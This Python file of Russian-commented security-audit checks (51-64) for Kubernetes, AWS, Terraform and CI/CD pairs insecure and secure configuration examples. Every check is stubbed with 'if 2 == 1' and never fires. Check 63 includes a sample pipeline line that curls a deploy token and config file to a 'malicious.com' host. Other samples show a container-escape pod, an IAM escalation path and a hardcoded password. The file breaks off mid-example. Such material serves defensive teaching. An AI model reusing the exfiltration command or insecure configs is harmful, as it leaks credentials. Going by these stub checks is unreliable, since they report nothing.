"""
🔐 Security Auditor — Hard Level Checks (51-75)
CIS Kubernetes | Docker | AWS | GCP | Azure | CI/CD
"""
from core import BaseCheck, SecurityReport, Severity, CheckRegistry

# =============================================================================
# 🔹 COMPLEX KUBERNETES CHECKS (51-54)
# =============================================================================
@CheckRegistry.register
class Cross_File_Network_Policy_51(BaseCheck):
    """Проверка 51: Cross-File Network Policy"""
    RULE_NAME = "Cross-File Network Policy"
    STANDARD = "CIS-K8S-5.3.2"
    SEVERITY = Severity.HIGH
    CHECK_ID = "cross_file_network_policy_51"

    def check(self) -> SecurityReport:
        self.files_checked = ["3_Hard_test/03-01/01_pod.yaml",
                              "3_Hard_test/03-01/02_service.yaml",
                              "3_Hard_test/03-01/03_ingress.yaml",
                              "3_Hard_test/03-01/04_networkpolicy.yaml"]

        if 2 == 1:  # ⚠️ Замените на реальную проверку файла
            return self._create_report(
                issue="Pod может быть достигнут из интернета через цепочку Service → Ingress → NetworkPolicy",
                risk="Ложное чувство безопасности: есть NetworkPolicy, но трафик всё равно "
                     "доходит до пода через публичный Ingress. Атакующий может эксплуатировать "
                     "уязвимости в приложении.",
                insecure="""# 01_pod.yaml
apiVersion: v1
kind: Pod
metadata:
  labels:
    app: backend
# 02_service.yaml - Service без selector или с неправильным
apiVersion: v1
kind: Service
spec:
  selector:
    app: backend
# 03_ingress.yaml - Ingress без TLS и ограничений
apiVersion: networking.k8s.io/v1
kind: Ingress
spec:
  rules:
  - http:
      paths:
      - backend:
          service:
            name: backend-svc
            port:
              number: 80
# ❌ Нет tls: секции, нет annotations для rate-limiting
# 04_networkpolicy.yaml - Политика разрешает всё из ingress-namespace
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
spec:
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          name: ingress-nginx""",
                secure="""# Согласованная конфигурация:
# 1. Ingress с TLS и ограничением по IP/annotations:
spec:
  tls:
  - hosts: [api.example.com]
    secretName: api-tls
  rules:
  - host: api.example.com
    http:
      paths: [...]
  annotations:
    nginx.ingress.kubernetes.io/whitelist-source-range: "10.0.0.0/8"
# 2. NetworkPolicy разрешает только от ingress-контроллера:
spec:
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          name: ingress-nginx
      podSelector:
        matchLabels:
          app.kubernetes.io/name: ingress-nginx
    ports:
    - protocol: TCP
      port: 8080""",
                remediation=[
                    "Настройте согласованные NetworkPolicy для всех сервисов",
                    "Включите TLS на всех Ingress",
                    "Ограничьте трафик на уровне ingress-контроллера",
                    "Используйте podSelector в NetworkPolicy для точного контроля"
                ]
            )
        return None

@CheckRegistry.register
class IAM_Privilege_Escalation_Path_52(BaseCheck):
    """Проверка 52: IAM Privilege Escalation Path"""
    RULE_NAME = "IAM Privilege Escalation Path"
    STANDARD = "CIS-AWS-1.18"
    SEVERITY = Severity.CRITICAL
    CHECK_ID = "iam_privilege_escalation_path_52"

    def check(self) -> SecurityReport:
        self.files_checked = ["3_Hard_test/03-02/01_iam_user.yaml",
                              "3_Hard_test/03-02/02_policy_passrole.yaml",
                              "3_Hard_test/03-02/03_policy_createpolicy.yaml"]

        if 2 == 1:  # ⚠️ Замените на реальную проверку файла
            return self._create_report(
                issue="Комбинация политик IAM позволяет пользователю повысить свои привилегии",
                risk="Privilege escalation: пользователь получает административные права, "
                     "может создать новых пользователей, удалить логи, получить доступ "
                     "ко всем ресурсам аккаунта.",
                insecure="""# Политика 1: разрешает PassRole
{
  "Effect": "Allow",
  "Action": "iam:PassRole",
  "Resource": "arn:aws:iam::123456789012:role/AdminRole"
}
# Политика 2: разрешает изменять политики
{
  "Effect": "Allow",
  "Action": [
    "iam:CreatePolicyVersion",
    "iam:SetDefaultPolicyVersion"
  ],
  "Resource": "arn:aws:iam::123456789012:policy/SelfPolicy"
}
# Комбинация: пользователь может создать версию политики с "*" правами""",
                secure="""# Принцип наименьших привилегий + условия:
{
  "Effect": "Allow",
  "Action": "iam:PassRole",
  "Resource": "arn:aws:iam::123456789012:role/LimitedRole",
  "Condition": {
    "StringEquals": {
      "iam:PassedToService": "ec2.amazonaws.com"
    }
  }
}
# Запретить создание версий политик для не-админов:
{
  "Effect": "Deny",
  "Action": [
    "iam:CreatePolicyVersion",
    "iam:SetDefaultPolicyVersion"
  ],
  "Resource": "*",
  "Condition": {
    "ArnNotLike": {
      "aws:PrincipalArn": "arn:aws:iam::123456789012:role/Admin"
    }
  }
}""",
                remediation=[
                    "Разделите PassRole и CreatePolicyVersion права",
                    "Добавьте условия (Condition) к IAM политикам",
                    "Запретите создание версий политик для обычных пользователей",
                    "Используйте IAM Access Analyzer для аудита"
                ]
            )
        return None

@CheckRegistry.register
class Service_Account_Token_Abuse_53(BaseCheck):
    """Проверка 53: Service Account Token Abuse"""
    RULE_NAME = "Service Account Token Abuse"
    STANDARD = "CIS-K8S-5.2.11"
    SEVERITY = Severity.HIGH
    CHECK_ID = "service_account_token_abuse_53"

    def check(self) -> SecurityReport:
        self.files_checked = ["3_Hard_test/03-03/01_pod.yaml",
                              "3_Hard_test/03-03/02_serviceaccount.yaml",
                              "3_Hard_test/03-03/03_rolebinding.yaml"]

        if 2 == 1:  # ⚠️ Замените на реальную проверку файла
            return self._create_report(
                issue="ServiceAccount имеет избыточные права и используется в поде с авто-монтированием токена",
                risk="Компрометация одного пода = доступ ко всем секретам namespace. "
                     "Кража токенов баз данных, API-ключей, TLS-сертификатов.",
                insecure="""# 02_serviceaccount.yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: app-sa
  namespace: default
automountServiceAccountToken: true (по умолчанию)
# 03_rolebinding.yaml - SA имеет доступ ко всем секретам
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: sa-secrets-access
roleRef:
  kind: Role
  name: secret-reader
subjects:
- kind: ServiceAccount
  name: app-sa
  namespace: default
# Role с широкими правами:
rules:
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["get", "list", "watch"]  # Чтение всех секретов!""",
                secure="""# 1. Отключить авто-монтирование токена:
apiVersion: v1
kind: ServiceAccount
metadata:
  name: app-sa
automountServiceAccountToken: false
# 2. Ограничить права на конкретные секреты:
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
rules:
- apiGroups: [""]
  resources: ["secrets"]
  resourceNames: ["app-specific-secret"]  # Только нужный секрет!
  verbs: ["get"]
# 3. Если токен не нужен - не монтировать:
spec:
  serviceAccountName: app-sa
  automountServiceAccountToken: false""",
                remediation=[
                    "Отключите automountServiceAccountToken для всех SA",
                    "Ограничьте RBAC права до конкретных ресурсов",
                    "Используйте отдельные SA для каждого приложения",
                    "Регулярно аудируйте RoleBinding"
                ]
            )
        return None

@CheckRegistry.register
class Lateral_Movement_Path_54(BaseCheck):
    """Проверка 54: Lateral Movement Path"""
    RULE_NAME = "Lateral Movement Path"
    STANDARD = "NIST-AC-4"
    SEVERITY = Severity.CRITICAL
    CHECK_ID = "lateral_movement_path_54"

    def check(self) -> SecurityReport:
        self.files_checked = ["3_Hard_test/03-04/01_ec2_instance.yaml",
                              "3_Hard_test/03-04/02_iam_role.yaml",
                              "3_Hard_test/03-04/03_s3_bucket.yaml",
                              "3_Hard_test/03-04/04_lambda_function.yaml",
                              "3_Hard_test/03-04/05_resource_policy.yaml"]

        if 2 == 1:  # ⚠️ Замените на реальную проверку файла
            return self._create_report(
                issue="Цепочка разрешений позволяет перемещаться между ресурсами (VM → IAM → S3 → Lambda → EC2)",
                risk="Lateral movement: атакующий, получивший доступ к одной VM, "
                     "может через цепочку доверенных отношений получить контроль "
                     "над всей инфраструктурой.",
                insecure="""# Цепочка атаки:
# 1. EC2 с ролью:
IamInstanceProfile:
  Arn: arn:aws:iam::123456789012:instance-profile/EC2-Role
# 2. Role с правами на S3 и Lambda:
Policies:
  Statement:
  - Effect: Allow
    Action: ["s3:GetObject", "s3:PutObject"]
    Resource: "arn:aws:s3:::shared-bucket/*"
  - Effect: Allow
    Action: ["lambda:InvokeFunction"]
    Resource: "arn:aws:lambda:::function:*"
# 3. Bucket с политикой, разрешающей Lambda:
BucketPolicy:
  Principal:
    Service: lambda.amazonaws.com
  Action: "s3:GetObject"
# 4. Lambda с ролью для управления EC2:
Role: arn:aws:iam::123456789012:role/Lambda-EC2-Admin
Policy:
  Effect: Allow
  Action: ["ec2:StartInstances", "ec2:StopInstances"]
  Resource: "*"
# Итог: EC2 → S3 → Lambda → ВСЕ EC2""",
                secure="""# Разрыв цепочки доверия:
# 1. Принцип наименьших привилегий для каждой роли:
- EC2-Role: только чтение из конкретного S3 префикса
- Lambda-Role: только инвок конкретной функции, только определённые EC2
# 2. Явные условия в политиках:
"Condition": {
  "StringEquals": {
    "s3:ExistingObjectTag/Environment": "production",
    "aws:SourceArn": "arn:aws:lambda:region:account:function:trusted-func"
  }
}
# 3. Resource-based policies с ограничением источника
# 4. Мониторинг и алертинг на аномальные вызовы""",
                remediation=[
                    "Применяйте принцип наименьших привилегий для каждой роли",
                    "Добавьте условия (Condition) к IAM политикам",
                    "Ограничьте Resource до конкретных ARN",
                    "Настройте мониторинг межсервисных вызовов"
                ]
            )
        return None

# =============================================================================
# 🔹 COMPLIANCE & GOVERNANCE CHECKS (55-58)
# =============================================================================
@CheckRegistry.register
class Secret_Rotation_Compliance_55(BaseCheck):
    """Проверка 55: Secret Rotation Compliance"""
    RULE_NAME = "Secret Rotation Compliance"
    STANDARD = "NIST-IA-5.1"
    SEVERITY = Severity.HIGH
    CHECK_ID = "secret_rotation_compliance_55"

    def check(self) -> SecurityReport:
        self.files_checked = ["3_Hard_test/03-05/01_secret.yaml",
                              "3_Hard_test/03-05/02_rotation_policy.yaml"]

        if 2 == 1:  # ⚠️ Замените на реальную проверку файла
            return self._create_report(
                issue="Пароль в Secrets Manager старше 90 дней без автоматической ротации",
                risk="Устаревшие учётные данные: при компрометации злоумышленник "
                     "имеет длительный доступ. Нарушение требований PCI-DSS, SOC2, GDPR.",
                insecure="""# 01_secret.yaml - Secret без автоматической ротации
Type: AWS::SecretsManager::Secret
Properties:
  Name: prod/database/password
AutomaticRotationRules отсутствует!
# Или:
AutomaticRotationRules:
  Duration: 365  # Ротация раз в год (слишком редко!)
# Фактический LastRotatedDate: 2024-01-01 (более 90 дней назад)""",
                secure="""# Настройка автоматической ротации:
Type: AWS::SecretsManager::Secret
Properties:
  Name: prod/database/password
  GenerateSecretString:
    SecretStringTemplate: !Sub '{"username": "${DBUser}"}'
    GenerateStringKey: "password"
    PasswordLength: 32
  AutomaticRotationRules:
    Duration: 90  # Ротация каждые 90 дней
  RotationRules:
    AutomaticallyAfterDays: 90
  RotationLambdaARN: !Ref RotationLambdaFunction
# Дополнительно: CloudWatch Events для алерта""",
                remediation=[
                    "Включите автоматическую ротацию для всех секретов",
                    "Настройте RotationLambdaARN для кастомной ротации",
                    "Создайте алерты на неудачную ротацию",
                    "Регулярно аудируйте age секретов"
                ]
            )
        return None

@CheckRegistry.register
class Unused_IAM_Credentials_56(BaseCheck):
    """Проверка 56: Unused IAM Credentials"""
    RULE_NAME = "Unused IAM Credentials"
    STANDARD = "CIS-AWS-1.15"
    SEVERITY = Severity.MEDIUM
    CHECK_ID = "unused_iam_credentials_56"

    def check(self) -> SecurityReport:
        self.files_checked = ["3_Hard_test/03-06/01_iam_user.yaml",
                              "3_Hard_test/03-06/02_access_key.yaml",
                              "3_Hard_test/03-06/03_cloudtrail_events.json"]

        if 2 == 1:  # ⚠️ Замените на реальную проверку файла
            return self._create_report(
                issue="IAM user с ключами, не использованными 90+ дней",
                risk="Неактивные ключи = 'спящая' уязвимость. При утечке таких ключей "
                     "атакующий может действовать незамеченным, так как легитимной "
                     "активности нет и аномалии сложнее детектировать.",
                insecure="""# 01_iam_user.yaml - Пользователь с активными ключами
Type: AWS::IAM::User
Properties:
  UserName: legacy-service-account
# 02_access_key.yaml - AccessKey создан 180 дней назад
Type: AWS::IAM::AccessKey
Properties:
  UserName: !Ref LegacyUser
  Status: Active (по умолчанию)
  CreatedDate: 2024-07-01
# 03_cloudtrail_events.json - Нет событий использования ключа:
{ "eventName": [], "lastUsedDate": null }
# Или последнее использование: 2024-07-15 (более 90 дней назад)""",
                secure="""# 1. Автоматическое отключение неиспользуемых ключей:
# Lambda функция, проверяющая AccessKeyLastUsed через IAM API
# и деактивирующая ключи, не использованные >90 дней
# 2. Политика удаления:
Type: AWS::IAM::User
Properties:
  UserName: legacy-service-account
# 02_access_key.yaml с условиями:
- Status: Inactive (если не используется)
# 3. Мониторинг:
Type: AWS::Config::ConfigRule
Properties:
  ConfigRuleName: iam-unused-credentials-check
  Source:
    Owner: AWS
    SourceIdentifier: IAM_USER_UNUSED_CREDENTIALS_CHECK""",
                remediation=[
                    "Отключите ключи, не использованные 90+ дней",
                    "Настройте AWS Config rule для мониторинга",
                    "Внедрите процесс offboarding для ключей",
                    "Используйте временные credentials через STS"
                ]
            )
        return None

@CheckRegistry.register
class Kubernetes_RBAC_Overprivileged_57(BaseCheck):
    """Проверка 57: Kubernetes RBAC Overprivileged"""
    RULE_NAME = "Kubernetes RBAC Overprivileged"
    STANDARD = "CIS-K8S-5.1.8"
    SEVERITY = Severity.CRITICAL
    CHECK_ID = "kubernetes_rbac_overprivileged_57"

    def check(self) -> SecurityReport:
        self.files_checked = ["3_Hard_test/03-07/01_clusterrole.yaml",
                              "3_Hard_test/03-07/02_clusterrolebinding.yaml"]

        if 2 == 1:  # ⚠️ Замените на реальную проверку файла
            return self._create_report(
                issue="ClusterRole с verbs: ['*'] на resources: ['*']",
                risk="Полный контроль над кластером: чтение всех секретов, "
                     "создание привилегированных подов, модификация RBAC, "
                     "удаление критических ресурсов. Компрометация = потеря кластера.",
                insecure="""# 01_clusterrole.yaml - Чрезмерно широкая роль
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: super-admin
rules:
- apiGroups: ["*"]      # Все группы API
  resources: ["*"]       # Все ресурсы
  verbs: ["*"]           # Все действия!
  nonResourceURLs: ["*"]
  verbs: ["*"]
# 02_clusterrolebinding.yaml - Привязка к обычному пользователю
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: give-super-admin
subjects:
- kind: User
  name: developer@company.com  # Обычный разработчик!""",
                secure="""# Принцип наименьших привилегий:
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: app-deployer
rules:
# Только необходимые ресурсы и действия:
- apiGroups: ["apps"]
  resources: ["deployments", "replicasets"]
  verbs: ["get", "list", "watch", "create", "update", "patch"]
  # ❌ Нет "delete", нет "*"
- apiGroups: [""]
  resources: ["pods", "services", "configmaps"]
  verbs: ["get", "list", "create", "update"]
  # ❌ Нет доступа к secrets, rbac, nodes
# Привязка только к нужным сервис-аккаунтам:
kind: ClusterRoleBinding
subjects:
- kind: ServiceAccount
  name: ci-cd-sa
  namespace: ci-cd""",
                remediation=[
                    "Замените wildcard на конкретные действия",
                    "Ограничьте resources до необходимых",
                    "Используйте ServiceAccount вместо User",
                    "Внедрите регулярный аудит RBAC"
                ]
            )
        return None

@CheckRegistry.register
class Role_Binding_to_Default_SA_58(BaseCheck):
    """Проверка 58: Role Binding to Default SA"""
    RULE_NAME = "Role Binding to Default SA"
    STANDARD = "CIS-K8S-5.1.9"
    SEVERITY = Severity.HIGH
    CHECK_ID = "role_binding_to_default_sa_58"

    def check(self) -> SecurityReport:
        self.files_checked = ["3_Hard_test/03-08/01_rolebinding.yaml",
                              "3_Hard_test/03-08/02_serviceaccount.yaml"]

        if 2 == 1:  # ⚠️ Замените на реальную проверку файла
            return self._create_report(
                issue="RoleBinding на serviceAccountName: default",
                risk="Неявное наследование прав: любой новый под, любой деплой "
                     "без явного указания SA получает привилегии. Усложняет аудит "
                     "и контроль доступа, увеличивает поверхность атаки.",
                insecure="""# 01_rolebinding.yaml - Права на default ServiceAccount
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: grant-secrets-to-default
  namespace: production
subjects:
- kind: ServiceAccount
  name: default              # ❌ Опасно!
  namespace: production
# Любой под в namespace production без явного serviceAccountName:
apiVersion: v1
kind: Pod
metadata:
  name: any-pod
  namespace: production
spec:
  # serviceAccountName не указан = используется "default"
  containers:
  - name: app
    image: nginx
# Этот под автоматически получит права на чтение секретов!""",
                secure="""# 1. Никогда не привязывать роли к "default" SA:
subjects:
- kind: ServiceAccount
  name: app-specific-sa    # ✅ Конкретный, именованный SA
  namespace: production
# 2. Создать специфичный SA для каждого приложения:
apiVersion: v1
kind: ServiceAccount
metadata:
  name: app-specific-sa
  namespace: production
  automountServiceAccountToken: false
# 3. Явно указывать SA в каждом поде:
spec:
  serviceAccountName: app-specific-sa""",
                remediation=[
                    "Удалите все RoleBinding на default SA",
                    "Создайте именованные ServiceAccount для каждого приложения",
                    "Явно указывайте serviceAccountName в каждом Pod",
                    "Отключите automountServiceAccountToken по умолчанию"
                ]
            )
        return None

# =============================================================================
# 🔹 KUBERNETES ADMISSION & ESCAPE CHECKS (59-60)
# =============================================================================
@CheckRegistry.register
class Admission_Controller_Disabled_59(BaseCheck):
    """Проверка 59: Admission Controller Disabled"""
    RULE_NAME = "Admission Controller Disabled"
    STANDARD = "CIS-K8S-5.1.4"
    SEVERITY = Severity.HIGH
    CHECK_ID = "admission_controller_disabled_59"

    def check(self) -> SecurityReport:
        self.files_checked = ["3_Hard_test/03-09/01_apiserver_config.yaml",
                              "3_Hard_test/03-09/02_admission_plugins.yaml"]

        if 2 == 1:  # ⚠️ Замените на реальную проверку файла
            return self._create_report(
                issue="Отсутствуют критические admission-плагины (PodSecurity, AlwaysPullImages)",
                risk="Отсутствие контроля на этапе создания ресурсов: пользователи "
                     "могут запускать привилегированные контейнеры, использовать "
                     "host-namespace, обходить ограничения безопасности.",
                insecure="""# 01_apiserver_config.yaml - Конфигурация API Server
apiVersion: v1
kind: Pod
metadata:
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - name: kube-apiserver
    command:
    - kube-apiserver
    - --enable-admission-plugins=NodeRestriction,ServiceAccount
# ❌ Нет PodSecurity, нет AlwaysPullImages, нет DenyEscalatingExec
# 02_admission_plugins.yaml - Список включённых плагинов:
enabled:
- NodeRestriction
- ServiceAccount
# ❌ Отсутствуют:
# - PodSecurity (или PodSecurityPolicy для старых версий)
# - AlwaysPullImages
# - DenyEscalatingExec
# - SecurityContextDeny""",
                secure="""# Включить необходимые admission-плагины (K8s 1.23+):
--enable-admission-plugins=NodeRestriction,ServiceAccount,PodSecurity,AlwaysPullImages,DenyEscalatingExec
# Для PodSecurity admission настроить уровни через labels на namespace:
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
# Для старых версий использовать PodSecurityPolicy или OPA/Gatekeeper""",
                remediation=[
                    "Включите PodSecurity admission plugin",
                    "Настройте AlwaysPullImages для контроля образов",
                    "Используйте OPA/Gatekeeper для кастомных политик",
                    "Аудируйте конфигурацию API Server"
                ]
            )
        return None

@CheckRegistry.register
class Container_Breakout_Potential_60(BaseCheck):
    """Проверка 60: Container Breakout Potential"""
    RULE_NAME = "Container Breakout Potential"
    STANDARD = "CIS-K8S-5.2.14"
    SEVERITY = Severity.CRITICAL
    CHECK_ID = "container_breakout_potential_60"

    def check(self) -> SecurityReport:
        self.files_checked = ["3_Hard_test/03-10/01_pod.yaml",
                              "3_Hard_test/03-10/02_hostpath_volume.yaml"]

        if 2 == 1:  # ⚠️ Замените на реальную проверку файла
            return self._create_report(
                issue="Комбинация: privileged + hostPath + capabilities позволяет escape на хост",
                risk="Container escape: злоумышленник может:\n"
                     "  • Прочитать /etc/shadow, SSH-ключи, токены\n"
                     "  • Запустить процесс на хосте, установить бэкдор\n"
                     "  • Изменить конфигурацию ядра, отключить безопасность\n"
                     "  • Получить полный контроль над узлом и кластером",
                insecure="""# 01_pod.yaml - Опасная комбинация настроек
apiVersion: v1
kind: Pod
metadata:
  name: dangerous-pod
spec:
  containers:
  - name: app
    image: nginx
    securityContext:
      privileged: true                    # ✅ Полный доступ к хосту
      capabilities:
        add:
        - SYS_ADMIN                       # ✅ Монтирование ФС, управление ядром
        - NET_ADMIN                       # ✅ Изменение сетевых настроек
    volumeMounts:
    - name: host-root
      mountPath: /host
# 02_hostpath_volume.yaml - Монтирование корня хоста
volumes:
- name: host-root
  hostPath:
    path: /                               # ✅ Доступ ко всей ФС хоста!
    type: Directory""",
                secure="""# Убрать все опасные настройки:
spec:
  containers:
  - name: app
    image: nginx:1.21.0
    securityContext:
      privileged: false
      allowPrivilegeEscalation: false
      runAsNonRoot: true
      runAsUser: 1000
      capabilities:
        drop:
        - ALL
# ✅ Без volumeMounts к hostPath
# Если нужен доступ к хост-файлам - использовать максимально ограниченный путь:
volumes:
- name: config-volume
  hostPath:
    path: /etc/myapp/config  # ✅ Только конкретная директория
    type: Directory
  volumeMounts:
  - name: config-volume
    mountPath: /etc/config
    readOnly: true""",
                remediation=[
                    "Удалите privileged: true из всех подов",
                    "Не монтируйте hostPath к корню хоста",
                    "Используйте drop: ALL для capabilities",
                    "Включите AppArmor/SELinux профили"
                ]
            )
        return None

# =============================================================================
# 🔹 INFRASTRUCTURE AS CODE CHECKS (61-62)
# =============================================================================
@CheckRegistry.register
class Terraform_Hardcoded_Secrets_61(BaseCheck):
    """Проверка 61: Terraform Hardcoded Secrets"""
    RULE_NAME = "Terraform Hardcoded Secrets"
    STANDARD = "CIS-TF-1.1"
    SEVERITY = Severity.CRITICAL
    CHECK_ID = "terraform_hardcoded_secrets_61"

    def check(self) -> SecurityReport:
        self.files_checked = ["3_Hard_test/03-11/01a_main_vulnerable.tf",
                              "3_Hard_test/03-11/01b_main_secure.tf",
                              "3_Hard_test/03-11/02a_variables_vulnerable.tf",
                              "3_Hard_test/03-11/03a_terraform_vulnerable.tfvars"]

        if 2 == 1:  # ⚠️ Замените на реальную проверку файла
            return self._create_report(
                issue="Секреты зашиты прямо в код инфраструктуры (.tf файлы)",
                risk="Утечка секретов через историю git, PR, бэкапы. "
                     "Сложность ротации (нужно менять в коде и деплоить). "
                     "Нарушение принципов безопасности и комплаенса.",
                insecure="""# 01a_main_vulnerable.tf - Секрет прямо в ресурсе
resource "aws_db_instance" "prod" {
  identifier = "prod-db"
  username   = "admin"
  password   = "SuperSecret123!"  # ❌ Хардкод пароля!
  engine     = "postgres"
}
# 02a_variables_vulnerable.tf - Переменная с дефолтным секретом
variable "db_password" {
  type    = string
  default = "SuperSecret123!"  # ❌ Дефолтное значение = секрет в коде
  sensitive = false
}
# 03a_terraform_vulnerable.tfvars - Секрет в tfvars (может быть в git!)
db_password = "SuperSecret123!" """,
                secure="""# 01b_main_secure.tf - Использование внешних источников
resource "aws_db_instance" "prod" {
  identifier = "prod-db"
  username   = "admin"
  password   = var.db_password  # ✅ Ссылка на переменную
}
# 02b_variables_secure.tf - Переменная без дефолта, с флагом sensitive
variable "db_password" {
  type        = string
  description = "Database password (provide via env or secrets manager)"
  sensitive   = true  # ✅ Не логировать значение
  # ❌ Нет default!
}
# 03b_terraform_secure.tfvars - НЕ коммитить в git!
# Использовать .gitignore для *.tfvars
# Или использовать backend secrets (Secrets Manager, Vault)""",
                remediation=[
                    "Удалите все hardcoded secrets из .tf файлов",
                    "Используйте Secrets Manager или Vault",
                    "Добавьте sensitive = true для переменных с секретами",
                    "Включите .gitignore для *.tfvars файлов"
                ]
            )
        return None

@CheckRegistry.register
class State_File_Public_Access_62(BaseCheck):
    """Проверка 62: State File Public Access"""
    RULE_NAME = "State File Public Access"
    STANDARD = "CIS-TF-2.2"
    SEVERITY = Severity.CRITICAL
    CHECK_ID = "state_file_public_access_62"

    def check(self) -> SecurityReport:
        self.files_checked = ["3_Hard_test/03-12/01_backend.tf",
                              "3_Hard_test/03-12/02a_s3_bucket_vulnerable.tf",
                              "3_Hard_test/03-12/03a_bucket_policy_vulnerable.tf"]

        if 2 == 1:  # ⚠️ Замените на реальную проверку файла
            return self._create_report(
                issue="Terraform state файл доступен публично в S3 bucket",
                risk="terraform.tfstate содержит в открытом виде:\n"
                     "  • Пароли баз данных, API-ключи, TLS private keys\n"
                     "  • Конфигурации всех ресурсов, сетевые топологии\n"
                     "  • Зависимости между ресурсами (граф атаки)\n"
                     "Публичный доступ = полная компрометация инфраструктуры.",
                insecure="""# 01_backend.tf - S3 backend без шифрования и с публичным доступом
terraform {
  backend "s3" {
    bucket = "my-terraform-state"
    key    = "prod/terraform.tfstate"
    region = "us-east-1"
    # ❌ Нет encrypt = true
    # ❌ Нет dynamodb_table для locking
  }
}
# 02a_s3_bucket_vulnerable.tf - Bucket с публичным ACL
resource "aws_s3_bucket" "terraform_state" {
  bucket = "my-terraform-state"
  acl    = "public-read"  # ❌ Публичный доступ на чтение!
}
# 03a_bucket_policy_vulnerable.tf - Политика разрешает всем
policy = jsonencode({
  Statement = [{
    Effect    = "Allow"
    Principal = "*"  # ❌ Любой пользователь!
    Action    = "s3:GetObject"
    Resource  = "${aws_s3_bucket.terraform_state.arn}/*"
  }]
})""",
                secure="""# 01_backend.tf - Безопасная конфигурация
terraform {
  backend "s3" {
    bucket         = "my-terraform-state"
    key            = "prod/terraform.tfstate"
    region         = "us-east-1"
    encrypt        = true                    # ✅ Шифрование на стороне S3
    kms_key_id     = "arn:aws:kms:..."       # ✅ CMK для контроля ключа
    dynamodb_table = "terraform-locks"       # ✅ State locking
  }
}
# 02b_s3_bucket_secure.tf - Bucket без публичного доступа
resource "aws_s3_bucket_public_access_block" "terraform_state" {
  bucket                  = aws_s3_bucket.terraform_state.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}
# 03b_bucket_policy_secure.tf - Доступ только для доверенных ролей
Principal = {
  AWS = [
    "arn:aws:iam::123456789012:role/terraform-ci",
    "arn:aws:iam::123456789012:role/admin-users"
  ]
}""",
                remediation=[
                    "Включите шифрование state файла (encrypt = true)",
                    "Настройте state locking через DynamoDB",
                    "Заблокируйте публичный доступ к S3 bucket",
                    "Ограничьте доступ до конкретных IAM ролей"
                ]
            )
        return None

# =============================================================================
# 🔹 CI/CD & SUPPLY CHAIN CHECKS (63-65)
# =============================================================================
@CheckRegistry.register
class CI_CD_Secret_Exfiltration_63(BaseCheck):
    """Проверка 63: CI/CD Secret Exfiltration"""
    RULE_NAME = "CI/CD Secret Exfiltration"
    STANDARD = "NIST-SI-10"
    SEVERITY = Severity.CRITICAL
    CHECK_ID = "ci_cd_secret_exfiltration_63"

    def check(self) -> SecurityReport:
        self.files_checked = ["3_Hard_test/03-13/01_pipeline.yaml",
                              "3_Hard_test/03-13/02_webhook_config.yaml"]

        if 2 == 1:  # ⚠️ Замените на реальную проверку файла
            return self._create_report(
                issue="Pipeline может отправить секреты на внешний webhook",
                risk="Эксфильтрация секретов: токены, пароли, ключи отправляются "
                     "на внешний сервер. Злоумышленник получает доступ к продакшену, "
                     "базам данных, облачным аккаунтам.",
                insecure="""# 01_pipeline.yaml - GitLab CI с потенциальной эксфильтрацией
deploy:
  stage: deploy
  script:
  - echo "Deploying with token $DEPLOY_TOKEN"
  # ❌ Логирование секрета в консоль (попадает в логи CI)
  - curl -X POST https://external-logging.malicious.com/collect \\
    -H "Authorization: $DEPLOY_TOKEN" \\  # ❌ Отправка токена наружу!
    -d "data=$(cat config.json)"
# 02_webhook_config.yaml - Webhook без валидации
webhook:
  url: https://external-logging.malicious.com/collect  # ❌ Недоверенный домен
  headers:
    Authorization: $CI_JOB_TOKEN  # ❌ Токен передаётся наружу""",
                secure="""# 1. Никогда не логировать секреты:
script:
- echo "Deploying..."  # ✅ Без упоминания переменных с секретами
- curl -X POST https://internal-monitoring.company.com/deploy \\
  -H "Authorization: Bearer $INTERNAL_TOKEN" \\  # ✅ Только доверенные домены
  -d "status=success"
# 2. Валидация внешних endpoint'ов:
# - Использовать allowlist доменов в CI конфигурации
# - Проверять SSL сертификаты, использовать mTLS
# 3. Маскирование секретов в логах:
variables:
  DEPLOY_TOKEN:
    value: $DEPLOY_TOKEN
    masked: true      # ✅ Не показывать в логах
    protected: true   # ✅ Только для защищённых веток""",
                remediation=[
                    "Запретите логирование переменных с секретами",
                    "Используйте allowlist доменов для webhook",
                    "Включите masked: true для всех секретов",
                    "Аудируйте исходящие запросы из CI-раннеров"
                ]
            )
        return None

@CheckRegistry.register
class Dependency_Chain_Vulnerability_64(BaseCheck):
    """Проверка 64: Dependency Chain Vulnerability"""
    RULE_NAME = "Dependency Chain Vulnerability"
    STANDARD = "NIST-SI-2"
    SEVERITY = Severity.HIGH
    CHECK_ID = "dependency_chain_vulnerability_64"

    def check(self) -> SecurityReport:
        self.files_checked = ["3_Hard_test/03-14/02_base_image.yaml",
                              "3_Hard_test/03-14/03_cve_database.json"]

        if 2 == 1:  # ⚠️ Замените на реальную проверку файла
            return self._create_report(
                issue="Образ использует базовый образ с известными CVE",
                risk="Эксплуатация уязвимостей в зависимостях:\n"
                     "  • RCE через уязвимость в базовом образе\n"
                     "  • Утечка данных через уязвимость в библиотеке\n"
                     "  • DoS, privilege escalation, supply-chain атаки\n"
                     "Сложность обнаружения: уязвимости 'наследуются' по цепочке.",
                insecure="""# 02_base_image.yaml - Dockerfile с уязвимым базовым образом
FROM python:3.8-slim  # ❌ Устаревший образ с известными CVE
# CVE-2023-XXXX: уязвимость в openssl 1.1.1k
# CVE-2024-YYYY: уязвимость в glibc
RUN pip install flask==2.0.0  # ❌ Устаревшая версия с уязвимостями
RUN apt-get update && apt-get install -y \\
  libssl1.1=1.1.1k-1  # ❌ Конкретная уязвимая версия
# 03_cve_database.json - База CVE показывает:
{
